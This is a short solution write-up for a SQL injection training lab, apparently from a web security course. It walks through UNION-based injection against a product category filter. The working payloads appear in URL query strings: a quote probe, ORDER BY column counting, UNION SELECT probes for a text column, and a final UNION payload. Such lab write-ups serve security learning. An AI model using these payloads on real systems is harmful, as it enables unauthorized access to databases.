# SQL injection UNION attack, finding a column containing text
# Objective
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. \

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

# Solution

`/filter?category=’` —> Application is vulnerable 

## Determining the number of columns
`/filter?category=Pets' order by 1--` \
`/filter?category=Pets' order by 2--` \
`/filter?category=Pets' order by 3--` \
`/filter?category=Pets' order by 4--` -> Error

## Determining the types of columns
`/filter?category=Pets' union select null, null, null--` -> Number of columns = 3 \
`/filter?category=Pers' union select 'a', null, null--` -> Error \
`/filter?category=Pers' union select null, 'a', null--` -> OK \
`/filter?category=Pers' union select null, null, 'a'--` -> Error \

## Returning provided value
```
/filter?category=Pers' union select null, 'MzE7Z8', null--
```